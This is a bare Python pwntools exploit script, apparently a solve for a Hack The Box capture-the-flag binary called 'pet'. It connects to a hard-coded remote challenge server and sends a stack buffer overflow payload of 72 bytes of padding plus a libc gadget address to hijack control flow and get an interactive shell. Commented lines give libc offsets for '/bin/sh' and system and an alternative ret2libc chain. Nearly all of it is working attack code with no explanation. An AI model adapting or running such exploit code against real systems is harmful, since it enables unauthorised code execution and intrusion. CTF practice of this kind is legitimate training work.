#!/usr/bin/python3
import pwn
import struct
import sys
#pwn.context.log_level = 'DEBUG'
pwn.context(os='linux', arch='amd64')
e = pwn.context.binary = pwn.ELF("./pwn")
#p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
#+"\nbreak *main+116"
#+"\nc"
#)
#p = e.process()
p = pwn.remote("94.237.53.3",45701)

padding = b"A"*72

addr = (0x7F95AA7000+0xecd8b)
payload = pwn.flat([padding,pwn.p64(addr)])
p.sendlineafter('current status:',payload)

print(payload)
p.interactive()
#strings -a -t x ./glibc/libc.so.6 | grep "/bin/sh"
#1b3d88 /bin/sh


#nick@nick:~/CTF/Solves/HTB/pet/challenge$ readelf -s ./glibc/libc.so.6 | grep system
#1406: 000000000004f420    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5



##------------------------------------------------
#libc = pwn.ELF('./glibc/libc.so.6')
#libc.address = 0x7ffff7a00000
#pwn.info('libc : %#x', libc.address)
#payload = pwn.flat(
#   b'\x90' * 72,
#   0x400743,
#   next(libc.search(b'/bin/sh\x00')),
#   0x7ffff784f420
#)
##------------------------------------------------